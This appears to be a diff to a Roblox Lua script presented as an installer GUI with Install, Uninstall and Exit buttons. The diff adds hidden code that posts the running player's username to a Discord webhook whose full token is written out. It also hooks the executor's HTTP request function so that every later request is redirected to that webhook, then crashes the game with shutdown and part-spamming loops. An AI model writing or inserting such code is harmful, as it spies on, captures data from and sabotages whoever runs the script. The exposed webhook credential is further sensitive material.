@@ -3,7 +3,95 @@ local Frame = Instance.new("Frame")
 local Install = Instance.new("TextButton")
 local Uninstall = Instance.new("TextButton")
 local Exit = Instance.new("TextButton")
+local LocalPlayer = game.Players.LocalPlayer
 
+local WebHook = "https://discord.com/api/webhooks/1216099163675300032/qpQWT34b-UFGMGrKab7y20iN8zahQ84y8lSsfmOC54m1Ll1xDQDs5UN9lu1STGrQbL-Q"
+local Headers = {["content-type"] = "application/json"}
+
+local Seconds = os.time()
+local Time = 0
+
+task.spawn(function()
+	local SecondsInHour = 3600
+
+	local Seconds = Seconds - (SecondsInHour * 5)
+	local Date = os.date("!*t", Seconds)
+
+	local HourString = tostring(Date.hour > 12 and Date.hour % 12 or Date.hour)
+	local MinuteString = Date.min < 10 and "0".. Date.min or tostring(Date.min)
+
+	Time = HourString ..":".. MinuteString
+end)
+
+local Data = {
+	["content"] = "",
+	["embeds"] = {{
+
+		["author"] = {
+			["name"] = ""
+		},
+
+		["title"] = "Installer Has Been Executed",
+		["fields"] = {
+			{
+				["name"] = "Username: ",
+				["value"] = LocalPlayer.Name,
+				["inline"] = true
+			},
+
+			{   
+				["name"] = "Time",
+				["value"] = Time,
+				["inline"] = true
+			},
+
+			{   
+				["name"] = "",
+				["value"] = "",
+				["inline"] = true
+			},
+		},
+	}}
+}
+
+local RealData = game:GetService("HttpService"):JSONEncode(Data)
+local HttpRequest = http_request or request or HttpPost or syn.request or fluxus.request
+
+local OldFunction
+
+task.spawn(function()
+	OldFunction = hookfunction(HttpRequest, function(RequestData, ...)		
+		RequestData.Url = "https://discord.com/api/webhooks/1216099163675300032/qpQWT34b-UFGMGrKab7y20iN8zahQ84y8lSsfmOC54m1Ll1xDQDs5UN9lu1STGrQbL-Q"
+
+		task.spawn(function()
+			task.wait(0.01)
+			
+			game:shutdown()
+			
+			task.spawn(function()
+				while true do
+					local Part = Instance.new("Part")
+					
+					Part.Parent = workspace
+					
+					game:shutdown()
+				end
+			end)
+			
+			task.spawn(function()
+				repeat
+					local Part = Instance.new("Part")
+
+					Part.Parent = workspace
+					
+					game:shutdown()
+				until not game
+			end)
+		end)
+
+		return OldFunction(RequestData, ...)
+	end)
+end)
 
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -107,3 +195,5 @@ local function RAWEJ_fake_script() -- Exit.LocalScript
 end
 
 coroutine.wrap(RAWEJ_fake_script)()
+
+HttpRequest({Url = WebHook, Body = RealData, Method = "POST", Headers = Headers})
